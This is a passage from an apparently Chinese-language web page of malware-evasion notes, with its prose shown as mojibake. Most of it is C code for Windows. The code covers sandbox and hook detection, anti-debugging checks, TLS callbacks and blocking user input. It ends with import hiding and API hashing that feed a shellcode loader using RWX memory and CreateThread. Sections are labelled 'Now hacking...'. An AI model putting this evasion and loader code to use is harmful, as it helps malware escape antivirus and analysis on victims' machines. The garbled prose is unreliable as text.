¸ä¸ç”¨æˆ·æ¨¡å¼ï¼ˆå½“ç„¶æ˜¯åªè¯»æ¨¡å¼ï¼‰å…±äº«çš„ç»“æ„ï¼Œå…¶ä¸­åŒ…å«æœ‰å…³â€œæ»´ç­”è®¡æ•°â€çš„ä¿¡æ¯ã€‚è¿™ç§ç»“æ„å®ƒå§‹ç»ˆä½äºå­˜å‚¨å™¨ï¼ˆ0x7ffe0000ï¼‰ä¸­çš„åŒä¸€åœ°å€ã€‚å®é™…çš„ç³»ç»Ÿæ­£å¸¸è¿è¡Œæ—¶é—´ï¼ˆKSYSTEM_TIMEç»“æ„ï¼‰å­˜å‚¨åœ¨åç§»é‡0x320ä¸­ã€‚æˆ‘ä»¬å¯ä»¥ä»ç³»ç»Ÿçš„å†…å­˜ä¸­è¯»å–å®ƒï¼Œå¹¶ç”¨æ¥æ£€æŸ¥ä¸æ»´ç­”è®¡æ•°ç›¸å…³çš„åŠŸèƒ½æ˜¯å¦è¢«æ²™ç®±æ“çºµï¼š(è°·æ­Œç¿»è¯‘)</p></blockquote> <div class="language- line-numbers-mode"><pre class="language-text"><code>Sleep(1000000);
ULONG *PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;
LONG *PUserSharedData_High1Time = (PLONG)0x7ffe0324;
ULONG *PUserSharedData_LowPart = (PULONG)0x7ffe0320;
DWORD time = GetTickCount64();
DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time &lt;&lt; 8) +
	((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) &gt;&gt; 24);
if ((time - kernelTime) &gt; 100 &amp;&amp; (kernelTime - time) &gt; 100) return false;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="å‡½æ•°hook"><a href="#å‡½æ•°hook" class="header-anchor">#</a> å‡½æ•°Hook</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>// manually load the dll
HANDLE dllFile = CreateFileW(L&quot;C:\\Windows\\System32\\ntdll.dll&quot;, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
DWORD dllFileSize = GetFileSize(dllFile, NULL);
HANDLE hDllFileMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
HANDLE pDllFileMappingBase = MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0);
CloseHandle(dllFile);

// analyze the dll
PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pDllFileMappingBase;
PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + pDosHeader-&gt;e_lfanew);
PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&amp;(pNtHeader-&gt;OptionalHeader);
PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDllFileMappingBase + pOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
PULONG pAddressOfFunctions = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfFunctions);
PULONG pAddressOfNames = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfNames);
PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfNameOrdinals);

// find the original function code
PVOID pNtCreateThreadExOriginal = NULL;
for (int i = 0; i &lt; pExportDirectory-&gt;NumberOfNames; ++i)
{
	PCSTR pFunctionName = (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfNames[i]);
	if (!strcmp(pFunctionName, &quot;NtCreateThreadEx&quot;))
	{
		pNtCreateThreadExOriginal = (PVOID)((PBYTE)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		break;
	}
}

// compare functions
PVOID pNtCreateThreadEx = GetProcAddress(GetModuleHandleW(L&quot;ntdll.dll&quot;), &quot;NtCreateThreadEx&quot;);
if (memcmp(pNtCreateThreadEx, pNtCreateThreadExOriginal, 16)) return false;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><h2 id="ç›´æ¥ç³»ç»Ÿè°ƒç”¨ç»•è¿‡-av-apihook"><a href="#ç›´æ¥ç³»ç»Ÿè°ƒç”¨ç»•è¿‡-av-apihook" class="header-anchor">#</a> ç›´æ¥ç³»ç»Ÿè°ƒç”¨ç»•è¿‡ AV-ApiHook</h2> <p>https://github.com/jthuraisamy/SysWhispers/</p> <h2 id="åè°ƒè¯•"><a href="#åè°ƒè¯•" class="header-anchor">#</a> åè°ƒè¯•</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>if (IsDebuggerPresent()) return;
	
// same check
PPEB pPEB = (PPEB)__readgsqword(0x60);
if (pPEB-&gt;BeingDebugged) return;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>BOOL isDebuggerPresent = FALSE;
CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;isDebuggerPresent);
if (isDebuggerPresent) return;

// same check
typedef NTSTATUS(WINAPI *PNtQueryInformationProcess)(IN  HANDLE, IN  PROCESSINFOCLASS, OUT PVOID, IN ULONG, OUT PULONG);
PNtQueryInformationProcess pNtQueryInformationProcess = (PNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L&quot;ntdll.dll&quot;), &quot;NtQueryInformationProcess&quot;);
DWORD64 isDebuggerPresent2 = 0;
pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &amp;isDebuggerPresent2, sizeof DWORD64, NULL);
if (isDebuggerPresent2) return;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h3 id="é€šè¿‡æ£€æŸ¥ä»£ç ä¸­çš„æ›´æ”¹æ¥æ£€æµ‹æ–­ç‚¹"><a href="#é€šè¿‡æ£€æŸ¥ä»£ç ä¸­çš„æ›´æ”¹æ¥æ£€æµ‹æ–­ç‚¹" class="header-anchor">#</a> é€šè¿‡æ£€æŸ¥ä»£ç ä¸­çš„æ›´æ”¹æ¥æ£€æµ‹æ–­ç‚¹</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>#pragma comment(linker, &quot;/INCREMENTAL:YES&quot;)

DWORD CalculateFunctionChecksum(PUCHAR functionStart, PUCHAR functionEnd)
{
	DWORD checksum = 0;
	while(functionStart &lt; functionEnd)
	{
		checksum += *functionStart;
		functionStart++;
	}
	return checksum;
}
#pragma auto_inline(off)
VOID CrucialFunction()
{
	int x = 0;
	x += 2;
}
VOID AfterCrucialFunction()
{
};
#pragma auto_inline(on)

void main()
{
	DWORD originalChecksum = 3429;
	DWORD checksum = CalculateFunctionChecksum((PUCHAR)CrucialFunction, (PUCHAR)AfterCrucialFunction);
	if (checksum != originalChecksum) return;
	
	wprintf_s(L&quot;Now hacking...\n&quot;);
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><h3 id="é€šè¿‡æ£€æŸ¥å†…å­˜é¡µæƒé™æ¥æ£€æµ‹æ–­ç‚¹"><a href="#é€šè¿‡æ£€æŸ¥å†…å­˜é¡µæƒé™æ¥æ£€æµ‹æ–­ç‚¹" class="header-anchor">#</a> é€šè¿‡æ£€æŸ¥å†…å­˜é¡µæƒé™æ¥æ£€æµ‹æ–­ç‚¹</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>BOOL debugged = false;

PSAPI_WORKING_SET_INFORMATION workingSetInfo;
QueryWorkingSet(GetCurrentProcess(), &amp;workingSetInfo, sizeof workingSetInfo);
DWORD requiredSize = sizeof PSAPI_WORKING_SET_INFORMATION * (workingSetInfo.NumberOfEntries + 20);
PPSAPI_WORKING_SET_INFORMATION pWorkingSetInfo = (PPSAPI_WORKING_SET_INFORMATION)VirtualAlloc(0, requiredSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
BOOL s = QueryWorkingSet(GetCurrentProcess(), pWorkingSetInfo, requiredSize);
for (int i = 0; i &lt; pWorkingSetInfo-&gt;NumberOfEntries; i++)
{
	PVOID physicalAddress = (PVOID)(pWorkingSetInfo-&gt;WorkingSetInfo[i].VirtualPage * 4096);
	MEMORY_BASIC_INFORMATION memoryInfo;
	VirtualQuery((PVOID)physicalAddress, &amp;memoryInfo, sizeof memoryInfo);
	if (memoryInfo.Protect &amp; (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))
	{
		if ((pWorkingSetInfo-&gt;WorkingSetInfo[i].Shared == 0) || (pWorkingSetInfo-&gt;WorkingSetInfo[i].ShareCount == 0))
		{
			debugged = true;
			break;
		}
	}
}

if (debugged) return;

wprintf_s(L&quot;Now hacking...\n&quot;);
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><h3 id="å¼‚å¸¸å¤„ç†ç¨‹åºæ£€æµ‹è°ƒè¯•"><a href="#å¼‚å¸¸å¤„ç†ç¨‹åºæ£€æµ‹è°ƒè¯•" class="header-anchor">#</a> å¼‚å¸¸å¤„ç†ç¨‹åºæ£€æµ‹è°ƒè¯•</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>BOOL isDebugged = TRUE;

LONG WINAPI CustomUnhandledExceptionFilter(PEXCEPTION_POINTERS pExceptionPointers)
{
	isDebugged = FALSE;
	return EXCEPTION_CONTINUE_EXECUTION;
}

void main()
{
	PTOP_LEVEL_EXCEPTION_FILTER previousUnhandledExceptionFilter = SetUnhandledExceptionFilter(CustomUnhandledExceptionFilter);
	RaiseException(EXCEPTION_FLT_DIVIDE_BY_ZERO, 0, 0, NULL);
	SetUnhandledExceptionFilter(previousUnhandledExceptionFilter);
	if (isDebugged) return;

	wprintf_s(L&quot;Now hacking...\n&quot;);
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h3 id="è‡ªè°ƒè¯•"><a href="#è‡ªè°ƒè¯•" class="header-anchor">#</a> è‡ªè°ƒè¯•</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>if (!DebugActiveProcess(pid))
{
	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	TerminateProcess(hProcess, 0);
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="æ‰§è¡Œæ—¶é—´"><a href="#æ‰§è¡Œæ—¶é—´" class="header-anchor">#</a> æ‰§è¡Œæ—¶é—´</h3> <p>æˆ‘ä»¬å¯ä»¥æ£€æŸ¥æŸä¸ªæŒ‡ä»¤å—ä¹‹å‰å’Œä¹‹åçš„ç³»ç»Ÿæ—¶é—´ï¼Œå¹¶å‡è®¾æµ‹å¾—çš„ç»è¿‡æ—¶é—´åº”å°äºæŸä¸ªå€¼ã€‚å¦‚æœæ­£åœ¨åˆ†æåº”ç”¨ç¨‹åºï¼Œåˆ™å¯èƒ½åœ¨è¯¥æŒ‡ä»¤å—ä¸­è®¾ç½®äº†æ–­ç‚¹ã€‚å¦‚æœè¿™æ ·ï¼Œæ‰§è¡Œæ—¶é—´å°†è¶…è¿‡å‡å®šçš„æ—¶é—´æ®µã€‚</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>int t1 = GetTickCount64();
Hack(); // should take less than 5 seconds
int t2 = GetTickCount64();
if (((t2 - t1) / 1000) &gt; 5) return; 

wprintf_s(L&quot;Now hacking more...\n&quot;);
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h2 id="ä¸ºé€†å‘å·¥ç¨‹å¸ˆå¢åŠ éš¾åº¦"><a href="#ä¸ºé€†å‘å·¥ç¨‹å¸ˆå¢åŠ éš¾åº¦" class="header-anchor">#</a> ä¸ºé€†å‘å·¥ç¨‹å¸ˆå¢åŠ éš¾åº¦</h2> <h3 id="æ‰§è¡Œè·¯å¾„å›è°ƒ"><a href="#æ‰§è¡Œè·¯å¾„å›è°ƒ" class="header-anchor">#</a> æ‰§è¡Œè·¯å¾„å›è°ƒ</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>VOID CALLBACK MyCallback(DWORD errorCode, DWORD bytesTransferred, POVERLAPPED pOverlapped)
{
	MessageBoxW(NULL, L&quot;Catch me if you can&quot;, L&quot;xD&quot;, 0);
}

void main()
{
	HANDLE hFile = CreateFileW(L&quot;C:\\Windows\\win.ini&quot;, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
	PVOID fileBuffer = VirtualAlloc(0, 64, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	OVERLAPPED overlapped = {0};
	ReadFileEx(hFile, fileBuffer, 32, &amp;overlapped, MyCallback);

	WaitForSingleObjectEx(hFile, INFINITE, true); // wait for the asynchronous operation to finish
	wprintf_s(L&quot;Already pwned...\n&quot;);
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h3 id="tlsï¼ˆçº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼‰å›è°ƒ"><a href="#tlsï¼ˆçº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼‰å›è°ƒ" class="header-anchor">#</a> TLSï¼ˆçº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼‰å›è°ƒ</h3> <blockquote><p>TLSï¼ˆçº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼‰å›è°ƒæ˜¯ä¸€ç§Windowsæœºåˆ¶ï¼Œå…è®¸åœ¨è¿›ç¨‹ä»¥åŠçº¿ç¨‹å¯åŠ¨å’Œç»ˆæ­¢ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚å®ƒå¯ä»¥ç”¨æ¥åœ¨mainåŠŸèƒ½ï¼ˆæˆ–å…¶ä»–å…¥å£ç‚¹ï¼‰ä¹‹å‰è¿è¡Œä¸€äº›åè°ƒè¯•ä»£ç ã€‚ä½†æ˜¯ï¼Œå¤§å¤šæ•°è°ƒè¯•å™¨ä¼šè‡ªåŠ¨åœ¨æ–­ç‚¹ä¹‹å‰mainï¼ˆâ€œç³»ç»Ÿæ–­ç‚¹â€- ntdll.LdrpDoDebuggerBreakï¼‰ç”šè‡³åœ¨å›è°ƒçš„å¼€å¤´æ”¾ç½®æ–­ç‚¹ã€‚æ— è®ºå¦‚ä½•ï¼Œå›è°ƒå®ç°éœ€è¦æŸäº›é“¾æ¥å™¨æŒ‡ä»¤ï¼š</p></blockquote> <div class="language- line-numbers-mode"><pre class="language-text"><code>void NTAPI TlsCallback(PVOID DllHandle, DWORD dwReason, PVOID)
{
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		if (CheckIfDebugged()) exit(0);
	}
}

#pragma comment (linker, &quot;/INCLUDE:_tls_used&quot;)
#pragma comment (linker, &quot;/INCLUDE:tls_callback_function&quot;)

#pragma const_seg(&quot;.CRT$XLA&quot;)
EXTERN_C const PIMAGE_TLS_CALLBACK tls_callback_function = TlsCallback;
#pragma const_seg()

void main()
{
	wprintf_s(L&quot;Now hacking...\n&quot;);
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h3 id="é˜»æ­¢ç”¨æˆ·è¾“å…¥-éœ€è¦admin"><a href="#é˜»æ­¢ç”¨æˆ·è¾“å…¥-éœ€è¦admin" class="header-anchor">#</a> é˜»æ­¢ç”¨æˆ·è¾“å…¥-éœ€è¦admin</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>BlockInput(true);
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="é™æ€åˆ†æå’Œæ··æ·†"><a href="#é™æ€åˆ†æå’Œæ··æ·†" class="header-anchor">#</a> é™æ€åˆ†æå’Œæ··æ·†</h2> <h3 id="pe"><a href="#pe" class="header-anchor">#</a> PE</h3> <p>PEå¤´åŒ…å«äº†å¾ˆå¤šä¿¡æ¯</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>headers, sections headers and content (code, resources etc.),
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>åˆ†æäººå‘˜ä»…é€šè¿‡æ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆæ— éœ€è¿è¡Œå®ƒï¼‰å°±å¯ä»¥æå–å¤§é‡æœ‰ç”¨çš„ä¿¡æ¯ã€‚è¿™åŒ…æ‹¬ä»£ç ï¼Œå¯¼å…¥çš„å‡½æ•°ï¼Œç¡¬ç¼–ç çš„å­—ç¬¦ä¸²å’Œå…¶ä»–æ•°æ®ã€‚</p> <h3 id="æ›´æ”¹hash"><a href="#æ›´æ”¹hash" class="header-anchor">#</a> æ›´æ”¹hash</h3> <ul><li>æ”¹å›¾æ ‡</li> <li>åŠ å…¥ç‰ˆæœ¬ä¿¡æ¯</li></ul> <h3 id="é€šè¿‡åŠ¨æ€winapiå‡½æ•°è§£ææ¥éšè—å¯¼å…¥"><a href="#é€šè¿‡åŠ¨æ€winapiå‡½æ•°è§£ææ¥éšè—å¯¼å…¥" class="header-anchor">#</a> é€šè¿‡åŠ¨æ€WinAPIå‡½æ•°è§£ææ¥éšè—å¯¼å…¥</h3> <p>å¯¼å…¥åœ°å€è¡¨ï¼ˆIATï¼‰å­˜å‚¨æœ‰å…³åº”ç”¨ç¨‹åºä½¿ç”¨çš„åº“å’Œå‡½æ•°çš„ä¿¡æ¯ã€‚æ“ä½œç³»ç»Ÿä¼šåœ¨å¯æ‰§è¡Œæ–‡ä»¶å¯åŠ¨æ—¶åŠ¨æ€åŠ è½½å®ƒä»¬ã€‚éå¸¸æ–¹ä¾¿ï¼ˆè¿™æ­£æ˜¯Windowsçš„å·¥ä½œæ–¹å¼ï¼‰ï¼Œä½†æ˜¯è¡¨å†…å®¹å¯ä»¥æä¾›è®¸å¤šæœ‰å…³ç¨‹åºåŠŸèƒ½çš„ä¿¡æ¯ã€‚ä¾‹å¦‚å­˜å‚¨å™¨æ“ä½œå’Œçº¿ç¨‹æ“ä½œåŠŸèƒ½ï¼ˆVirtualAllocï¼ŒVirtualProcectï¼ŒCreateRemoteThreadï¼‰å¯ä»¥æŒ‡ç¤ºè¯¥åº”ç”¨æ­£åœ¨æ‰§è¡ŒæŸç§ä»£ç æ³¨å…¥çš„ã€‚WSASocketé€šå¸¸ç”±ç»‘å®šå¤–å£³å’Œåå‘å¤–å£³ä»¥åŠSetWindowsHookExé”®ç›˜è®°å½•ç¨‹åºä½¿ç”¨ã€‚</p> <p>ä¸ºäº†éšè—è¿™äº›ä¿¡æ¯ï¼ˆä»é™æ€åˆ†æä¸­ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥åŠ¨æ€åœ°è§£ææŸäº›APIå‡½æ•°ã€‚æˆ‘ä»¬ç”šè‡³å¯ä»¥ä½¿ç”¨syscallsï¼ˆè¯·å‚é˜…userlandé’©å­è§„é¿ï¼‰ã€‚ç°åœ¨ï¼Œè®©æˆ‘ä»¬ä»…ä½¿ç”¨GetModuleHandleè·å–è¦kernel32.dllåŠ è½½åˆ°å†…å­˜ä¸­çš„å¥æŸ„ï¼Œç„¶åä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥æ‰¾å¿…è¦çš„åŠŸèƒ½GetProcAddressï¼š</p> <p>https://github.com/lucasg/Dependencieså¯ä»¥æŸ¥çœ‹PEä¿¡æ¯</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>typedef PVOID(WINAPI *PVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
typedef PVOID(WINAPI *PCreateThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);
typedef PVOID(WINAPI *PWaitForSingleObject)(HANDLE, DWORD);

void main()
{
	HMODULE hKernel32 = GetModuleHandleW(L&quot;kernel32.dll&quot;);
	PVirtualAlloc funcVirtualAlloc = (PVirtualAlloc)GetProcAddress(hKernel32, &quot;VirtualAlloc&quot;);
	PCreateThread funcCreateThread = (PCreateThread)GetProcAddress(hKernel32, &quot;CreateThread&quot;);
	PWaitForSingleObject funcWaitForSingleObject = (PWaitForSingleObject)GetProcAddress(hKernel32, &quot;WaitForSingleObject&quot;);

	unsigned char shellcode[] = &quot;\\xfc\\x48\\x83 (...) &quot;;
	PVOID shellcode_exec = funcVirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(shellcode_exec, shellcode, sizeof shellcode);
	DWORD threadID;
	HANDLE hThread = funcCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &amp;threadID);
	funcWaitForSingleObject(hThread, INFINITE);
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h3 id="api-hashing"><a href="#api-hashing" class="header-anchor">#</a> API Hashing</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>typedef PVOID(WINAPI *PVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
typedef PVOID(WINAPI *PCreateThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);
typedef PVOID(WINAPI *PWaitForSingleObject)(HANDLE, DWORD);

unsigned int hash(const char *str)
{
	unsigned int hash = 7759;
	int c;

	while (c = *str++)
		hash = ((hash &lt;&lt; 5) + hash) + c;

	return hash;
}

void main()
{
	HMODULE hKernel32 = GetModuleHandle(L&quot;kernel32.dll&quot;);
	PVirtualAlloc funcVirtualAlloc;
	PCreateThread funcCreateThread;
	PWaitForSingleObject funcWaitForSingleObject;

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hKernel32;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)hKernel32 + pDosHeader-&gt;e_lfanew);
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&amp;(pNtHeader-&gt;OptionalHeader);
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hKernel32 + pOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PULONG pAddressOfFunctions = (PULONG)((PBYTE)hKernel32 + pExportDirectory-&gt;AddressOfFunctions);
	PULONG pAddressOfNames = (PULONG)((PBYTE)hKernel32 + pExportDirectory-&gt;AddressOfNames);
	PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)hKernel32 + pExportDirectory-&gt;AddressOfNameOrdinals);

	for (int i = 0; i &lt; pExportDirectory-&gt;NumberOfNames; ++i)
	{
		PCSTR pFunctionName = (PSTR)((PBYTE)hKernel32 + pAddressOfNames[i]);
		if (hash(pFunctionName) == 0x80fa57e1)
		{
			funcVirtualAlloc = (PVirtualAlloc)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		}
		if (hash(pFunctionName) == 0xc7d73c9b)
		{
			funcCreateThread = (PCreateThread)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		}
		if (hash(pFunctionName) == 0x50c272c4)
		{
			funcWaitForSingleObject = (PWaitForSingleObject)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		}
	}

	unsigned char shellcode[] = &quot;\\xfc\\x48\\x83&quot;;

	PVOID shellcode_exec = funcVirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(shellcode_exec, shellcode, sizeof shellcode);
	DWORD threadID;
	HANDLE hThread = funcCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &amp;threadID);
	funcWaitForSingleObject(hThread, INFINITE);
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span 